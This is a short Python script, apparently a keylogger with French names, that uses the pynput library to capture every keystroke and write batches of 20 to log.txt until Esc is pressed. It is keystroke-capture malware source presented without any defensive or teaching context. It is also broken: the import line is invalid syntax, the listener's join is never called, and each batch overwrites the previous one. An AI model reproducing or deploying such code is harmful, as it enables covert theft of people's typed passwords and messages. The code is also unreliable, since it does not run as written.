import pynput

from pynput.keyboard import Key.Listener

keys = []
count = 0


def on_press(key):
	global keys,count
	keys.append(key)
	count +=1
	if count>=20:
		count = 0
		ecrire_fichier(keys)
		keys =[]


def ecrire_fichier(keys):
	with open("log.txt","w+") as fichier:
		for key in keys:
			fichier.write(str(key))

def on_release(key):	
	if key == Key.esc:
		return False


with Listener(on_press=on_press,on_release=on_release) as listener: 
	listener.join
